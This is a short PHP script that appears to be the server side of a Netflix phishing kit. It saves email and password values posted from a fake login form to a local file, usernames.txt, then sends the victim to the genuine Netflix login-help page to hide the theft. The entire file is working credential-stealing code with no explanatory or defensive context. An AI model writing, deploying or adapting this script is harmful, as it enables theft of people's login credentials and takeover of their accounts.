<?php

file_put_contents("usernames.txt", "Netflix :- username : " . $_POST['email'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com/us/LoginHelp');
exit();
